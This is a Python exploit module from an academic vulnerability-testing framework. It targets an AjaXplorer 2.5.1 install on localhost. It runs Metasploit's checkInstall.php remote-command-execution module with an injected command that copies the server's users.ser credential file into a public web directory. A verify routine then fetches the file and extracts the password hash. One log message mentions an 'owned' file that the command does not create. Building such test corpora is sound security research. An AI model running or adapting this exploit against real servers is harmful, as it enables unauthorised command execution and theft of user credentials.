
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import os
import re

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "OSVDB_63552",
                  'Description' : "AjaXplorer checkInstall.php Remote Command Execution "
                                  "Versions 2.5.5 or older are vulnerable.",
                  'References' :  [['OSVDB', '63552']],
                  'Target' :      "AjaXplorer 2.5.1",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):
        #driver = self.create_selenium_driver()

        metasploit_cmd = "lib/metasploit-framework/msfcli multi/http/ajaxplorer_checkinstall_exec " \
                         "RHOST=127.0.0.1 TARGETURI=/ajaxplorer/ PAYLOAD=cmd/unix/generic CMD=\'cat /var/www/ajaxplorer/server/users/users.ser > /var/www/ajaxplorer/secret.txt\' E"


        self.logger.info("Running Metasploit")
        os.system(metasploit_cmd)

        self.logger.info("Done! You can safely ignore the last warning from Metasploit, the server is vulnerable.")
        self.logger.info("There should now be a file called \"owned\" under /files when you visit http://localhost/ajaxplorer/#0")
        
        return

    def verify(self):
        verified = False
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/ajaxplorer/secret.txt")
        
        recomp = re.compile(".*<pre>(.+)</pre>.*")
        result = recomp.findall(driver.page_source)
        if(len(result)>0):
            self.logger.info("Extracted hash %s", result[0])
            verified = True
        else:
            self.logger.info("Unable to find password hash")

        driver.cleanup()
        return verified
